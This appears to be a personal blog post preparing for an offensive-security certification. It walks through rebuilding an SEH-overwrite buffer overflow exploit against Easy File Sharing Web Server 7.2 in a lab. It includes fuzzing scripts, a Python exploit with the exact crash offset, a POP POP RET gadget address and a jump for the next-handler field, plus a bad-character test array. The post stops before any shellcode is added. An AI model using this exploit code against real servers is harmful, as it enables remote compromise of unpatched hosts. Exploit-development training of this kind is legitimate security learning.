---
layout: single
title: CTP/OSCE Prep -- Easy File Sharing Web Server 7.2 SEH Overwrite
date: 2019-6-13
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about recreating an SEH Overwrite from an ExploitDB entry.

## Finding a Candidate Exploit

Since I've just about finished all of the Vulnserver exploits and have gone through most of the CTP material, I figured it's time to start getting some experience recreating real world exploits from scratch. I searched for 'SEH' on ExploitDB and settled on the [Easy File Sharing Web Server 7.2](https://www.exploit-db.com/exploits/39008) exploit. I picked this exploit in particular because up to this point I have not done much exploit developement with webservers, most of my experience has come from Vulnserver.  

## Fuzzing

The very first thing I did after downloading and installing the software from [here](http://www.sharing-file.com/) was look for `boofuzz` http fuzzing templates. The first one I came to was [here](https://github.com/jtpereyda/boofuzz-http) and has the following source code: 
```python
#!/usr/bin/env python
# Designed for use with boofuzz v0.0.9
from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("127.0.0.1", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1')
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2')
        s_string('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

The first thing I noticed was that the script creates a list of HTTP methods for `boofuzz` to craft packets from, fuzzes the `s_delim` entities `'space-1'` and `'space-2'`, and fuzzes `s_string` entities `'Request-URI'` and `'HTTP-Version'`. `boofuzz` does not fuzz `s_static` entities. 

As you can probably gather, this isn't a super in-depth fuzzing script but it's a great start. It's going to test several HTTP methods and it's going to fuzz about 4 values. Other standard HTTP request fields (such as User Agent) will not be fuzzed, but we can save that for another time.

After a round of fuzzing, the application crashes relatively closely and as you can see from the screenshot, we notice EAX has been overwritten with `C` values. 

![](/assets/images/CTP/efscrash1.JPG)

Looking through the payloads sent in the `boofuzz-results` folder, the only payload I could find mention of with `C` values was a 512 byte payload sent in the following format: `GET (C*n) `. This led me to believe that the field responsible for the crash was the value after the space in the `GET` request which in our case was the `'Request-URI'` `s_string` entity (`/index.html`). 

![](/assets/images/CTP/boofuzzresults.JPG)

It was pretty frustrating not seeing any reference to larger payloads sent by `boofuzz` in the results folder but at least I was able to sort of piece together the format that led to the crash. Terminal output payloads were as large as 100k bytes. I decided to se all of the other fuzzable entities in our `boofuzz` script to not fuzzable to test my half-baked theory. So now our `boofuzz` script looks like this: 
```python
#!/usr/bin/python

from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("192.168.1.201", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1', fuzzable = False)
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable = False)
        s_string('HTTP/1.1', name='HTTP-Version', fuzzable = False)
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

Again we get a crash and EAX is overwritten with `C` values. So we know for certain the `'Request-URI'` entity is vulnerable. Time to create a skeleton and recreate the crash. 

![](/assets/images/CTP/efscrash2.JPG)

## Skeleton Exploit

The first thing I did at this point was google for 'http skeleton exploits' and came across this [github repo](https://github.com/HanseSecure/ExploitDev/tree/master/poc) which included an http exploit skeleton. After modifying it slightly to fit my personal taste and our vulnerability analysis up to this point, our skeleton looks like this:
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

crash = "A" * 5000


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

(Notice that we took out the `'\n'` after the `'GET'` in our exploit code and replaced it with a space.)

Sending this payload crashes the server once more and we see that EAX has been overwritten with `A` values, we are in business!

![](/assets/images/CTP/efsskeleton.JPG)

## SEH Overwrite

Checking out the SEH Chain in Immunity shows us that we have overwritten both 4 byte components of the SEH. 

![](/assets/images/CTP/efsSEHchain.JPG)

After using `!mona pc 5000` and placing the resulting address in our SEH entry into `!mona po`, mona tells us that our SEH overwrite occurs after 4061 bytes. 

What we need now is the location of a `POP POP RET` gadget in this application so that we can place it in our current SEH 4 byte space and we can work our way 4 bytes backwards into the 4 byte space that typically holds the pointer to the next SEH. 

Using the `!mona seh` command, most of the addresses we see immediately stat with `00` which is not ideal since this will require us to include a null byte in our shellcode. We could try for a partial overwrite but instead, I kept looking for a more friendly 4 byte address and eventually found one at the following location in the `seh.txt` file that mona creates. 

![](/assets/images/CTP/sehlocation.JPG)

Our exploit code now looks like this. Notice that I added the `nseh` parameter (I used `\xcc` but you can use `\x90` as well) so that our math stays correct and we keep getting a consistent SEH overwrite. 
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

nseh = "\xcc" * 4

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

crash = "A" * 4061
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

Let's set a breakpoint on our `POP POP RET` address like so: 

![](/assets/images/CTP/efsbreak.JPG)

And then we can step through it and make sure we end up in our `\xcc` buffer that we created. 

![](/assets/images/CTP/stepthrough.gif)

Perfect, we land in our `\xcc` buffer as expected. We also have a huge amount of space in our `D` buffer to play with. This is looking like a case where we just need to jump over our existing current SEH handler code (`\x99\xab\x01\x10`), and land in our `D` buffer where can stuff some shellcode. 

To do this, I used our favorite Net Jump that we used previously in the series and made `nseh = '\x74\x06\x75\x04'`. This will jump if the Zero Flag is set or if the Zero Flag is not set, since it can only be one or the other, we are guaranteed to jump. We could've used a simple `'\xeb\x06\x90\x90'` value for `nseh` but this is less cool imo. :)

After executing this, take our jump and land in our `D` buffer. 

This is where things went horribly wrong. 

## Badcharacters Abound

Up until now, we've really only used a handful of characters: `\x41` for our `A` values, `\x44` for our `D` values, `\x99\xab\x01\x10` for `seh`, and `\x74\x06\x75\x04` for `nseh`. 

When I put shellcode in our `D` buffer, I didn't receive a callback to my netcat listener so I figured there were some badcharacters. I then tried to test for badcharacters the standard way and had some success by sending my payload, crashing the application, right-clicking on ESP and then selecting 'Follow in Dump', scrolling down until the `A` buffer ended and my bytearray of badchars appeared and seeing which characters were corrupted and removing them one by one. The exploit looked like this about midway through my testing: 
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

'''
nseh = "\x74\x06\x75\x04"

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

crash = "A" * 4061
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))
'''

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

crash = 'A' * 4500
crash += badchars
crash += 'D' * (5000 - len(crash))


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```



## Resources

+ 
